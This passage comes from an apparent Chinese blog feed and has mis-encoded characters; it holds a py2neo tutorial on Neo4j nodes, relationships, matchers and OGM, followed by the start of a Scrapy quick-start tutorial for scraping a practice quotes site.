è¦æ‰§è¡Œçš„æ“ä½œè½¬æ¢æˆ<code>cypher</code>è¯­å¥ï¼Œå†è®©<code>py2neo</code>æ‰§è¡Œæˆ–è®¸æ˜¯ä¸é”™çš„é€‰æ‹©ï¼Œå¦åˆ™ï¼Œæˆ‘æ›´æ¨èä½ ä½¿ç”¨<code>py2neo</code>æä¾›çš„æ¥å£</p></blockquote><ul><li><a href="https://py2neo.org/v4/">å®˜æ–¹æ–‡æ¡£</a></li></ul><h3 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> py2neo <span class="token keyword">import</span> <span class="token operator">*</span>NEO4J_URL <span class="token operator">=</span> <span class="token string">'http://localhost:7474'</span>NEO4J_USERNAME <span class="token operator">=</span> <span class="token string">'neo4j'</span>NEO4J_PASSWORD <span class="token operator">=</span> <span class="token string">'123456'</span>graph <span class="token operator">=</span> Graph<span class="token punctuation">(</span>NEO4J_URL<span class="token punctuation">,</span> username<span class="token operator">=</span>NEO4J_USERNAME<span class="token punctuation">,</span> password<span class="token operator">=</span>NEO4J_PASSWORD<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="èŠ‚ç‚¹"><a href="#èŠ‚ç‚¹" class="headerlink" title="èŠ‚ç‚¹"></a>èŠ‚ç‚¹</h3><h4 id="åˆ›å»ºèŠ‚ç‚¹"><a href="#åˆ›å»ºèŠ‚ç‚¹" class="headerlink" title="åˆ›å»ºèŠ‚ç‚¹"></a>åˆ›å»ºèŠ‚ç‚¹</h4><p>èŠ‚ç‚¹çš„å®šä¹‰ç”± <code>Node</code> å®ç°ï¼Œè¦å°†å…¶æ·»åŠ åˆ° <code>neo4j</code> æ•°æ®åº“ä¸­åˆ™å¯é€šè¿‡ <code>create</code> æˆ– <code>merge</code> æ–¹æ³•å®ç°ï¼Œä¸¤è€…éƒ½å¯åˆ›å»ºèŠ‚ç‚¹ï¼Œä½†æœ‰äº›è®¸çš„ä¸åŒï¼š</p><ul><li><code>create(node)</code> ï¼šå³ä¾¿æ˜¯å±æ€§å€¼ç›¸åŒçš„åŒä¸€èŠ‚ç‚¹ï¼Œåœ¨è°ƒç”¨ <code>create</code> ä¹‹åä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ–°èŠ‚ç‚¹</li><li><code>merge(node, &quot;node_label&quot;, &quot;main_attr&quot;)</code> ï¼šä¸»è¦æ˜¯ <code>main_attr</code> ï¼ˆä¸»å±æ€§ï¼‰ä¸€æ ·ï¼Œå°±è§†ä½œåŒä¸€èŠ‚ç‚¹ï¼Œå¯¹æ”¹èŠ‚ç‚¹åšçš„ä»»ä½•æ›´æ”¹åœ¨ <code>merge</code> çš„æ—¶å€™éƒ½ä¼šè¦†ç›–å·²æœ‰çš„èŠ‚ç‚¹ </li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">node0 <span class="token operator">=</span> Node<span class="token punctuation">(</span><span class="token string">'Person'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Alice'</span><span class="token punctuation">)</span>  <span class="token comment"># ç›´æ¥æŒ‡å®šå±æ€§</span><span class="token comment"># é€šè¿‡å±æ€§dictåˆ›å»º</span>person_info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jhon'</span><span class="token punctuation">&#125;</span>    node1 <span class="token operator">=</span> Node<span class="token punctuation">(</span><span class="token string">'Person'</span><span class="token punctuation">,</span> <span class="token operator">**</span>person_info<span class="token punctuation">)</span>graph<span class="token punctuation">.</span>create<span class="token punctuation">(</span>node0<span class="token punctuation">)</span>   <span class="token comment"># createåˆ›å»ºèŠ‚ç‚¹ï¼Œå¦‚æœä¸åšæ£€æŸ¥ï¼Œæ€»æ˜¯ä¼šåˆ›å»ºæ–°èŠ‚ç‚¹</span>graph<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>node1<span class="token punctuation">,</span><span class="token string">'Person'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span>   <span class="token comment"># å¦‚æœèŠ‚ç‚¹å·²å­˜åœ¨åˆ™è¦†ç›–(åªè¦åŒä¸€key)ï¼Œéœ€è¦æŒ‡å®šprimarykeyå’Œprimarylabel</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="æŸ¥æ‰¾èŠ‚ç‚¹"><a href="#æŸ¥æ‰¾èŠ‚ç‚¹" class="headerlink" title="æŸ¥æ‰¾èŠ‚ç‚¹"></a>æŸ¥æ‰¾èŠ‚ç‚¹</h4><ul><li>ç²¾ç¡®æŸ¥æ‰¾ï¼ˆæ ¹æ®æŒ‡å®šå±æ€§ï¼‰</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">matcher <span class="token operator">=</span> NodeMatcher<span class="token punctuation">(</span>graph<span class="token punctuation">)</span>matcher<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"Person"</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># è¿”å›node</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><div class="table-container"><table><thead><tr><th><strong>æè¿°</strong></th><th><strong>åç¼€</strong></th><th><strong>è¡¨è¾¾å¼</strong></th><th><strong>ç¤ºä¾‹</strong></th><th><strong>cypherè¯­å¥</strong></th></tr></thead><tbody><tr><td>ç›¸ç­‰</td><td>__exact</td><td>=</td><td>matcher.match(â€œPersonâ€, name__exact=â€Kevin Baconâ€)</td><td>MATCH (<em>:Person) WHERE name = â€œKevin Baconâ€ RETURN </em></td></tr><tr><td>ä¸ç­‰</td><td>__not</td><td>&lt;&gt;</td><td>matcher.match(â€œPersonâ€, name__not=â€Rick Astleyâ€)</td><td>MATCH (<em>:Person) WHERE </em>.name &lt;&gt; â€œRick Astleyâ€ RETURN _</td></tr><tr><td>å¤§äº</td><td>__gt</td><td>&gt;</td><td>matcher.match(â€œPersonâ€, born__gt=1985)</td><td>MATCH (<em>:Person) WHERE </em>.born &gt; 1985 RETURN _</td></tr><tr><td>å¤§äºç­‰äº</td><td>__gte</td><td>&gt;=</td><td>matcher.match(â€œPersonâ€, born__gte=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &gt;= 1965 RETURN _</td></tr><tr><td>å°äº</td><td>__lt</td><td>&lt;</td><td>matcher.match(â€œPersonâ€, born__lt=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &lt; 1965 RETURN _</td></tr><tr><td>å°äºç­‰äº</td><td>__lte</td><td>&lt;=</td><td>matcher.match(â€œPersonâ€, born__lte=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &lt;= 1965 RETURN _</td></tr><tr><td>ä»¥â€¦å¼€å¤´</td><td>__startswith</td><td>STARTS WITH</td><td>matcher.match(â€œPersonâ€, name__startswith=â€Kevinâ€)</td><td>MATCH (<em>:Person) WHERE </em>.name STARTS WITH â€œKevinâ€ RETURN _</td></tr><tr><td>ä»¥â€¦ç»“å°¾</td><td>__endswith</td><td>ENDS WITH</td><td>matcher.match(â€œPersonâ€, name__endswith=â€Smithâ€)</td><td>MATCH (<em>:Person) WHERE </em>.name ENDS WITH â€œSmithâ€ RETURN _</td></tr><tr><td>åŒ…å«</td><td>__contains</td><td>CONTAINS</td><td>matcher.match(â€œPersonâ€, name__contains=â€Jamesâ€)</td><td>MATCH (<em>:Person) HWERE </em>.name CONTAINS â€œJamesâ€ RETURN _</td></tr></tbody></table></div><ul><li>æ¨¡ç³ŠæŸ¥æ‰¾ï¼ˆæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ï¼‰</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;))  # _æŒ‡ä»£èŠ‚ç‚¹ï¼Œ~ä»£è¡¨é‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>æŸ¥æ‰¾ç»“æœæ’åºä¸é™åˆ¶</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;).order_by(&quot;_.name&quot;).limit(3))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>æŸ¥æ‰¾ç»“æœä¸ªæ•°</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">len(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>è·³è¿‡å‰nä¸ªæŸ¥æ‰¾ç»“æœ</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;).skip(3))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h4 id="èŠ‚ç‚¹å±æ€§ä¸æ ‡ç­¾"><a href="#èŠ‚ç‚¹å±æ€§ä¸æ ‡ç­¾" class="headerlink" title="èŠ‚ç‚¹å±æ€§ä¸æ ‡ç­¾"></a>èŠ‚ç‚¹å±æ€§ä¸æ ‡ç­¾</h4><ul><li>å±æ€§æ“ä½œ</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">node[key] &#x3D; value   # ç»™èŠ‚ç‚¹å±æ€§èµ‹å€¼del node[key]   # åˆ é™¤èŠ‚ç‚¹å±æ€§len(node)   # èŠ‚ç‚¹å±æ€§çš„ä¸ªæ•°dict(node)  # è¿”å›å­—å…¸ï¼ŒåŒ…æ‹¬äº†è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰å±æ€§node.identity   # è¿”å›èŠ‚ç‚¹id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>æ ‡ç­¾æ“ä½œ</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">node.labels     # è¿”å›èŠ‚ç‚¹çš„æ‰€æœ‰æ ‡ç­¾labelA in node.labels   # å¦‚æœèŠ‚ç‚¹å…·æœ‰æ ‡ç­¾labelAï¼Œè¿”å›Truenode.labels.add(labelB)     # ç»™èŠ‚ç‚¹å¢åŠ æ ‡ç­¾labelBnode.labels.discard(labelC)     # åˆ é™¤èŠ‚ç‚¹æ ‡ç­¾labelCnode.labels.remove(labelC)  # åŒä¸Šï¼Œä½†æ˜¯å¦‚æœlabelCä¸å­˜åœ¨çš„è¯ä¼šè¿”å›ValueErrornode.labels.clear()     # æ¸…é™¤èŠ‚ç‚¹æ‰€æœ‰æ ‡ç­¾node.labels.update(manylabels)  # ä»å¯è¿­ä»£å¯¹è±¡manylabelsä¸­ç»™èŠ‚ç‚¹å¢åŠ å¤šä¸ªæ ‡ç­¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="å…³ç³»"><a href="#å…³ç³»" class="headerlink" title="å…³ç³»"></a>å…³ç³»</h3><h4 id="åˆ›å»ºå…³ç³»"><a href="#åˆ›å»ºå…³ç³»" class="headerlink" title="åˆ›å»ºå…³ç³»"></a>åˆ›å»ºå…³ç³»</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">properties &#x3D; &#123;    &#39;year&#39; : 1999&#125;ab &#x3D; Relationship(node_a,&#39;knows&#39;, node_b, )  # åé¢è¿˜å¯ä»¥ä¼ å…¥å…³ç³»çš„å±æ€§å­—å…¸aa &#x3D; Relationship(node_a,&#39;like&#39;)ab[&#39;time&#39;] &#x3D; &#39;2019&#x2F;01&#x2F;01&#39;  # ç»™å…³ç³»æ·»åŠ å±æ€§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="æŸ¥æ‰¾å…³ç³»"><a href="#æŸ¥æ‰¾å…³ç³»" class="headerlink" title="æŸ¥æ‰¾å…³ç³»"></a>æŸ¥æ‰¾å…³ç³»</h4><ul><li>æŸ¥æ‰¾æ‰€æœ‰æŒ‡å®šç±»å‹çš„å…³ç³»</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">matcher&#x3D;RelationshipMatcher(graph)list(matcher.match(r_type&#x3D;&#39;KNOWS&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><ul><li>æŸ¥æ‰¾æŒ‡å®šèµ·å§‹èŠ‚ç‚¹æˆ–ç»ˆç‚¹çš„å…³ç³»</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">relation_matcher &#x3D; RelationshipMatcher(graph)result &#x3D; relation_matcher.match((node,), &#39;çˆ¶äº²&#39;).first()  # æ³¨æ„è¿™é‡Œçš„nodeéœ€è¦å…ˆæŒ‰ç…§nodematcher.matchå¾—åˆ°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><blockquote><p>(node,) ä¹Ÿå¯ä»¥æ˜¯{node}</p></blockquote><h4 id="å…³ç³»å±æ€§"><a href="#å…³ç³»å±æ€§" class="headerlink" title="å…³ç³»å±æ€§"></a>å…³ç³»å±æ€§</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">relationshipA &#x3D;&#x3D; relationshipBrelationshipA !&#x3D; relationshipB  # åˆ¤æ–­ä¸¤ä¸ªå…³ç³»æ˜¯å¦ç›¸ç­‰ï¼Œä½†æ˜¯å’ŒèŠ‚ç‚¹ä¸åŒï¼Œè¿™é‡Œåªè¦èµ·å§‹ã€ç»ˆæ­¢èŠ‚ç‚¹å’Œå…³ç³»ç±»å‹ç›¸åŒï¼Œå°±åˆ¤å®šä¸¤ä¸ªå…³ç³»ç›¸ç­‰del relationship[key]   # åˆ é™¤å±æ€§len(relationship)   # è¿”å›å±æ€§ä¸ªæ•°dict(relationship)  # è¿”å›å­—å…¸ï¼ŒåŒ…æ‹¬æ‰€æœ‰å±æ€§type(relationship)  # è¿”å›å…³ç³»çš„ç±»å‹relationship.nodes   # è¿”å›å…³ç³»ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="OGM"><a href="#OGM" class="headerlink" title="OGM"></a>OGM</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">from py2neo.ogm import GraphObject, RelatedTo, RelatedFromclass Movie(GraphObject):    __primarykey__ &#x3D; &quot;title&quot;    title &#x3D; Property()    tag_line &#x3D; Property(&quot;tagline&quot;)    released &#x3D; Property()    actors &#x3D; RelatedFrom(&quot;Person&quot;, &quot;ACTED_IN&quot;)    directors &#x3D; RelatedFrom(&quot;Person&quot;, &quot;DIRECTED&quot;)    producers &#x3D; RelatedFrom(&quot;Person&quot;, &quot;PRODUCED&quot;)class Person(GraphObject):    __primarykey__ &#x3D; &quot;name&quot;    name &#x3D; Property()  # Property(key&#x3D;&#39;å§“å&#39;, default&#x3D;&#39;Tom&#39;)    born &#x3D; Property()    acted_in &#x3D; RelatedTo(Movie)  # RelatedTo(Movie,relationship_type&#x3D;&#39;ACTED_IN&#39;), ç±»åå¼•å·å¯ç”¨å¯ä¸ç”¨    directed &#x3D; RelatedTo(Movie)    produced &#x3D; RelatedTo(Movie)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="æŸ¥æ‰¾èŠ‚ç‚¹-1"><a href="#æŸ¥æ‰¾èŠ‚ç‚¹-1" class="headerlink" title="æŸ¥æ‰¾èŠ‚ç‚¹"></a>æŸ¥æ‰¾èŠ‚ç‚¹</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">Person.match(graph, &quot;Alice&quot;).first()list(Person.match(graph).where(&quot;_.name &#x3D;~ &#39;A.*&#39;&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h4 id="å±æ€§-amp-æ“ä½œ"><a href="#å±æ€§-amp-æ“ä½œ" class="headerlink" title="å±æ€§&amp;æ“ä½œ"></a>å±æ€§&amp;æ“ä½œ</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">alice &#x3D; Person()alice.name &#x3D; &quot;Alice Smith&quot;graph.push(alice)  # ä¸éœ€è¦create&#x2F;merge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h4 id="åˆ›å»ºå…³ç³»-1"><a href="#åˆ›å»ºå…³ç³»-1" class="headerlink" title="åˆ›å»ºå…³ç³»"></a>åˆ›å»ºå…³ç³»</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cp &#x3D; Person()cp.name &#x3D; &#39;cp&#39;m1 &#x3D; Movie()m1.title &#x3D; &#39;ç…é¥¼ä¾ &#39;cp.acted_in.add(m1)  # æ·»åŠ cp-&gt;acted_in -&gt;m1ï¼Œ addæœ‰å‚æ•°ï¼Œå¯ç”¨äºä¼ å…¥å…³ç³»çš„å±æ€§ï¼Œç›´æ¥ä¼ å…¥å­—å…¸æˆ–**dict # cp.acted_in.remove(m1)  # ç§»é™¤å…³ç³»graph.push(cp)graph.push(m1)# adddef add(self, obj, properties&#x3D;None, **kwproperties):    &quot;&quot;&quot; Add or update a related object.    :param obj: the :py:class:&#96;.Model&#96; to relate    :param properties: dictionary of properties to attach to the relationship (optional)    :param kwproperties: additional keyword properties (optional)    &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>RelatedToæ˜¯ä¸»åŠ¨çš„ï¼ŒRelatedFromæ˜¯è¢«åŠ¨çš„ï¼Œå› æ­¤åªéœ€è¦æ·»åŠ RelatedToå…³ç³»ï¼ˆcp.acted_in.add(m1)ï¼‰ï¼Œå°±å¯ç”¨æŸ¥è¯¢ç›¸åº”m1.actors</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>py2neo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>scrapy å¿«é€Ÿä¸Šæ‰‹</title>
    <link href="/article/52452.html"/>
    <url>/article/52452.html</url>
    
    <content type="html"><![CDATA[<h1 id="Scrapyå¿«é€Ÿä¸Šæ‰‹"><a href="#Scrapyå¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="Scrapyå¿«é€Ÿä¸Šæ‰‹"></a>Scrapyå¿«é€Ÿä¸Šæ‰‹</h1><h2 id="scrapyç®€ä»‹"><a href="#scrapyç®€ä»‹" class="headerlink" title="scrapyç®€ä»‹"></a>scrapyç®€ä»‹</h2><p><code>scrapy</code>æ˜¯ä¸€æ¬¾çˆ¬è™«æ¡†æ¶ï¼Œç›¸æ¯”äºä¸€èˆ¬çš„åŸºäº<code>requests</code> è‡ªè¡Œç¼–å†™çš„çˆ¬è™«ï¼Œå…¶ç‰¹ç‚¹ä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li><strong>ç³»ç»ŸåŒ–&amp;ç»“æ„åŒ–</strong>ï¼šè¿™æ„å‘³ç€ä½ ç¼–å†™çš„ä»£ç èƒ½å¤Ÿæœ‰å¾ˆé«˜çš„æ‰©å±•æ€§ï¼Œç»´æŠ¤æ›´åŠ å®¹æ˜“ï¼Œå¯¹äºä¸æ“…é•¿è®¾è®¡é¡¹ç›®æ¶æ„çš„ç«¥é‹å¸®åŠ©å¾ˆå¤§</li><li><strong>é«˜æ•ˆç‡</strong>ï¼š<code>scrapy</code> è®©ä½ åœ¨ç¼–å†™ç¨‹åºçš„åŒæ—¶ä¸éœ€è¦è€ƒè™‘è®¸å¤šæ€§èƒ½ä¸Šçš„ä¸œè¥¿ï¼ˆä¾‹å¦‚å¤šçº¿ç¨‹ï¼‰ï¼Œè¿™äº›<code>scrapy</code> éƒ½å·²ä¸ºä½ è€ƒè™‘å¥½äº†ï¼Œä½ çœŸæ­£éœ€è¦å…³æ³¨çš„æ˜¯çˆ¬è™«çš„è§£æéƒ¨åˆ†</li><li><strong>ä¸€æ­¥åˆ°ä½</strong>ï¼šè¿™é‡ŒæŒ‡çš„æ˜¯ä¸€ä¸ªå®Œæ•´çš„çˆ¬è™«å·¥ä½œï¼ŒåŒ…æ‹¬é¡µé¢ä¸‹è½½-&gt;è§£æ-&gt;è¿‡æ»¤-&gt;å­˜å‚¨å‡ ä¸ªåŸºæœ¬æ­¥éª¤ï¼Œ<code>scrapy</code>éƒ½å­˜åœ¨ç›¸åº”çš„æ¨¡å—è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”è¿™äº›æ­¥éª¤ä¹‹é—´çš„è¡”æ¥ä¹Ÿç”±<code>scrapy</code>å®Œæˆï¼Œè®©ä½ æ‘†è„±æ•°æ®åœ¨ä¸åŒé˜¶æ®µä¼ è¾“çš„ç„¦è™‘</li></ul><p><code>scrapy</code>å®˜æ–¹æ–‡æ¡£å¯¹äºscrapyæœ‰ç€éå¸¸é²œæ˜çš„è§£é‡Šäº†ï¼ŒåŒ…æ‹¬<strong>ä¸€ä¸ªåŸºç¡€çš„æ•™ç¨‹</strong>ï¼Œ<strong>å„ä¸ªæ¨¡å—å…·ä½“çš„åŠŸèƒ½</strong>ï¼Œä»¥åŠä¸€äº›<strong>é«˜çº§æ“ä½œ</strong>ï¼Œæœ¬æ–‡æ¡£çš„ç›®çš„æ—¨åœ¨ï¼š<strong>å¿«é€Ÿä¸Šæ‰‹ï¼Œç•¥è¿‡ä¸€äº›ä¸å¿…è¦çš„ç»†èŠ‚ï¼Œå®ç°è®©ä¸€ä¸ªå°ç™½ä¹Ÿèƒ½æ ¹æ®æ–‡æ¡£å¿«é€Ÿå®ç°åˆ©ç”¨<code>scrapy</code>å®ç°ä¸€ä¸ªå®Œæ•´çš„çˆ¬è™«ã€‚</strong></p><ul><li><a href="https://docs.scrapy.org/en/latest/intro/tutorial.html">å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://scrapy-docs.readthedocs.io/zh/latest/intro/tutorial.html">ä¸­æ–‡æ–‡æ¡£</a></li></ul><h2 id="ä¸€ä¸ªç®€å•çš„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ä¾‹å­"></a>ä¸€ä¸ªç®€å•çš„ä¾‹å­</h2><blockquote><p>å¿«é€Ÿä¸Šæ‰‹ä¸€ä¸ªé¡¹ç›®çš„æ–¹å¼å°±æ˜¯è·‘é€šä¸€ä¸ªå°ä¾‹å­ï¼Œä¸€æ–¹é¢ç®€æ´çš„ç¨‹åºèƒ½æ›´å®¹æ˜“ç†è§£ï¼Œå¦ä¸€æ–¹é¢è·‘é€šç¨‹åºèƒ½å¤Ÿæé«˜æˆ‘ä»¬å¯¹é¡¹ç›®çš„ç ”ç©¶å…´è¶£ï¼Œä¸‹é¢çš„ä¾‹å­å®ç°çš„åŠŸèƒ½æ˜¯è®¿é—®è¯·æ±‚ï¼š<a href="http://quotes.toscrape.com/page/1/ï¼Œå°†è¯¥é¡µé¢æ¯ä¸ªæ–¹æ¡†å†…çš„**æ–‡å­—ã€ä½œè€…ã€æ ‡ç­¾**ä¿¡æ¯æå–å‡ºæ¥ï¼Œå¹¶å­˜å‚¨æˆ`json">http://quotes.toscrape.com/page/1/ï¼Œå°†è¯¥é¡µé¢æ¯ä¸ªæ–¹æ¡†å†…çš„**æ–‡å­—ã€ä½œè€…ã€æ ‡ç­¾**ä¿¡æ¯æå–å‡ºæ¥ï¼Œå¹¶å­˜å‚¨æˆ`json</a> lines`çš„å½¢å¼ã€‚</p></blockquote><ul><li>åˆ›å»ºä¸€ä¸ª<code>scrapy</code>é¡¹ç›®ï¼š<code>scrapy startproject tutorial</code>ï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹ç»“æ„çš„é¡¹ç›®ï¼Œç›®å‰ä¸å¿…çº ç»“æ¯ä¸ªæ–‡ä»¶ç›®å½•æ˜¯å¹²ä»€ä¹ˆçš„</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">tutorial<span class="token operator">/</span>    scrapy<span class="token punctuation">.</span>cfg            <span class="token comment"># deploy configuration file</span>    tutorial<span class="token operator">/</span>             <span class="token comment"># project's Python module, you'll import your code from here</span>        __init__<span class="token punctuation">.</span>py        items<span class="token punctuation">.</span>py          <span class="token comment"># project items definition file</span>        middlewares<span class="token punctuation">.</span>py    <span class="token comment"># project middlewares file</span>        pipelines<span class="token punctuation">.</span>py      <span class="token comment"># project pipelines file</span>        settings<span class="token punctuation">.</span>py       <span class="token comment"># project settings file</span>        spiders<span class="token operator">/</span>          <span class="token comment"># a directory where you'll later put your spiders</span>            __init__<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>spider</code> (é’ˆå¯¹æ¯ä¸€ä¸ªä¸åŒçš„ç½‘ç«™éƒ½è¦åˆ›å»ºä¸€ä¸ª<code>spider</code>) ï¼š<code>scrapy genspider quotes quotes.toscrape.com</code>,è¿™ä¼šåœ¨<code>spiders</code>ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QuotesSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">"quotes"</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'http://quotes.toscrape.com/page/1/'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>è¿™é‡Œæœ‰ä¸€äº›éœ€è¦è§£é‡Šçš„ï¼Œ<code>start_urls</code> æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«äº†æˆ‘ä»¬éœ€è¦çˆ¬å–çš„ç½‘å€ï¼ŒåŒæ—¶ä¹Ÿæ˜¯èµ·å§‹ç½‘å€ï¼Œå¯ä»¥ç†è§£ä¸ºçˆ¬è™«å…¥å£ï¼Œå¾ˆå¤šçˆ¬è™«ä¼šä»èµ·å§‹ç½‘å€å¼€å§‹ï¼Œä¸€æ­¥æ­¥æå–å‡ºæ›´å¤šçš„ç½‘å€å¹¶è¿›ä¸€æ­¥çˆ¬å–ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªè€ƒè™‘å•ä¸ªç½‘å€ã€‚<code>parse</code> æ˜¯ä¸€ä¸ªè§£ææ–¹æ³•ï¼Œå®ƒæœ‰ä¸€ä¸ªå‚æ•°<code>response</code> ï¼Œå°±æ˜¯çˆ¬å–<code>start_urls</code> åˆ—è¡¨ä¸­çš„ç½‘å€åå¾—åˆ°çš„ç»“æœï¼Œä½ å¯ä»¥ç†è§£ä¸º<code>response=requests.get(url=start_requests[i]), i=0,1,2...</code>  ï¼Œ<strong>æ³¨æ„</strong>ï¼Œçˆ¬è™«çš„æ ¸å¿ƒä»£ç å°±æ˜¯ä»ç½‘é¡µä¸­è§£æå‡ºæˆ‘ä»¬éœ€è¦çš„æ•°æ®ï¼Œå› æ­¤åœ¨ä½ çš„çˆ¬è™«æ–‡ä»¶ä¸­ç¼–å†™çš„å…¶ä»–å‡½æ•°ï¼ˆä¾‹å¦‚<code>parse_authro(self, response)</code>ï¼‰ï¼Œåº”è¯¥ä¹Ÿéµç…§è¿™ä¸ªæ€æƒ³ï¼šæ¥æ”¶responseï¼Œè§£ææ•°æ®ï¼Œ<code>yield</code> æ–°è¯·æ±‚ã€‚æœ‰ç‚¹æ‰¯è¿œäº†ï¼Œç»§ç»­ä¸‹ä¸€æ­¥</p></blockquote><ul><li>æˆ‘ä»¬éœ€è¦ä»<code>response</code>ä¸­è§£æå‡ºæ–¹æ¡†çš„å†…å®¹ï¼Œè¿™æ¥æºäºæˆ‘ä»¬å¯¹äºç½‘é¡µæºä»£ç 